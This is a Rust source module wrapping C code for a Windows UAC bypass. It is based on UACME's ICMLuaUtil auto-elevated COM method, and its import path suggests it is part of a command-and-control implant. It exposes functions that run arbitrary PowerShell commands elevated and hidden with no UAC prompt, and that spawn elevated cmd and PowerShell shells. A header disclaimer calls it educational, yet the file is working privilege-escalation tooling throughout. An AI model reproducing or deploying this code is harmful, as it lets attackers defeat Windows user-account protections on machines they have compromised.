//! UAC Bypass module - Rust FFI bindings for UACME code
//!
//! This module provides safe Rust wrappers around the C UAC bypass code
//! based on UACME project (method 41 - ICMLuaUtil by Oddvar Moe).
//!
//! # How it works
//!
//! The bypass exploits the auto-elevation feature of Windows COM objects.
//! CMSTPLUA (Connection Manager Service) is in the Windows auto-elevation list,
//! meaning it can create elevated COM objects without UAC prompt.
//!
//! We use the ICMLuaUtil interface which has a ShellExec method that
//! executes commands with elevated privileges.
//!
//! # Safety
//!
//! This code is for EDUCATIONAL PURPOSES ONLY.
//! Using UAC bypass techniques without authorization is illegal.

use std::os::raw::c_int;

/// Result codes from the UAC bypass C code
#[repr(C)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UacResult {
    /// Success
    Success = 0,
    /// COM initialization failed
    ComInitFailed = 1,
    /// Failed to create elevated COM object
    ElevationFailed = 2,
    /// ShellExec method failed
    ShellExecFailed = 3,
    /// Invalid parameters provided
    InvalidParams = 4,
    /// Unknown error
    UnknownError = 99,
}

impl From<c_int> for UacResult {
    fn from(value: c_int) -> Self {
        match value {
            0 => UacResult::Success,
            1 => UacResult::ComInitFailed,
            2 => UacResult::ElevationFailed,
            3 => UacResult::ShellExecFailed,
            4 => UacResult::InvalidParams,
            _ => UacResult::UnknownError,
        }
    }
}

impl std::fmt::Display for UacResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            UacResult::Success => write!(f, "Success"),
            UacResult::ComInitFailed => write!(f, "COM initialization failed"),
            UacResult::ElevationFailed => write!(f, "Failed to create elevated COM object"),
            UacResult::ShellExecFailed => write!(f, "ShellExec method failed"),
            UacResult::InvalidParams => write!(f, "Invalid parameters"),
            UacResult::UnknownError => write!(f, "Unknown error"),
        }
    }
}

// FFI declarations - link to C functions
#[cfg(target_os = "windows")]
extern "C" {
    /// Execute a file with elevated privileges via ICMLuaUtil COM bypass
    ///
    /// # Parameters
    /// - lpFile: Path to executable (wide string, null-terminated)
    /// - lpParameters: Command line arguments (wide string, can be null)
    /// - lpDirectory: Working directory (wide string, can be null)
    /// - nShow: Show window flag (SW_HIDE=0, SW_SHOW=5, etc.)
    ///
    /// # Returns
    /// UAC_RESULT enum value
    fn UacBypassShellExec(
        lpFile: *const u16,
        lpParameters: *const u16,
        lpDirectory: *const u16,
        nShow: c_int,
    ) -> c_int;
}

/// Window show options for ShellExec
#[derive(Debug, Clone, Copy)]
pub enum ShowWindow {
    Hide = 0,
    Normal = 1,
    Minimized = 2,
    Maximized = 3,
    Show = 5,
    ShowDefault = 10,
}

/// Convert a Rust string to a null-terminated wide string (UTF-16)
fn to_wide_string(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// UAC Bypass functionality
///
/// Provides methods to execute programs with elevated privileges
/// without triggering the UAC prompt (on vulnerable configurations).
#[cfg(target_os = "windows")]
pub struct UacBypass;

#[cfg(target_os = "windows")]
impl UacBypass {
    /// Execute a program with elevated privileges
    ///
    /// # Arguments
    /// * `file` - Path to the executable to run
    /// * `parameters` - Optional command line parameters
    /// * `directory` - Optional working directory
    /// * `show` - Window show mode
    ///
    /// # Returns
    /// `Ok(())` on success, `Err(UacResult)` on failure
    ///
    /// # Example
    /// ```ignore
    /// use c2_common::uacme::UacBypass;
    ///
    /// let result = UacBypass::shell_exec(
    ///     "powershell.exe",
    ///     Some("/c whoami > C:\\elevated.txt"),
    ///     None,
    ///     ShowWindow::Hide,
    /// );
    /// ```
    pub fn shell_exec(
        file: &str,
        parameters: Option<&str>,
        directory: Option<&str>,
        show: ShowWindow,
    ) -> Result<(), UacResult> {
        let file_wide = to_wide_string(file);

        let params_wide = parameters.map(to_wide_string);
        let params_ptr = params_wide
            .as_ref()
            .map(|v| v.as_ptr())
            .unwrap_or(std::ptr::null());

        let dir_wide = directory.map(to_wide_string);
        let dir_ptr = dir_wide
            .as_ref()
            .map(|v| v.as_ptr())
            .unwrap_or(std::ptr::null());

        let result =
            unsafe { UacBypassShellExec(file_wide.as_ptr(), params_ptr, dir_ptr, show as c_int) };

        let uac_result = UacResult::from(result);
        if uac_result == UacResult::Success {
            Ok(())
        } else {
            Err(uac_result)
        }
    }

    /// Execute powershell.exe with elevated privileges
    ///
    /// Convenience method that launches powershell.exe with the given command.
    ///
    /// # Arguments
    /// * `command` - Command to execute via powershell.exe /c
    /// * `hidden` - If true, run hidden; otherwise show window
    pub fn exec_command(command: &str, hidden: bool) -> Result<(), UacResult> {
        let params = format!("/c {}", command);
        let show = if hidden {
            ShowWindow::Hide
        } else {
            ShowWindow::Normal
        };
        Self::shell_exec("powershell.exe", Some(&params), None, show)
    }

    /// Spawn an elevated command prompt (not use for now)
    ///
    /// Opens a new cmd.exe window with elevated privileges.
    pub fn spawn_elevated_cmd() -> Result<(), UacResult> {
        Self::shell_exec("cmd.exe", None, None, ShowWindow::Normal)
    }

    /// Spawn an elevated PowerShell
    ///
    /// Opens a new PowerShell window with elevated privileges.
    pub fn spawn_elevated_powershell() -> Result<(), UacResult> {
        Self::shell_exec("powershell.exe", None, None, ShowWindow::Normal)
    }
}
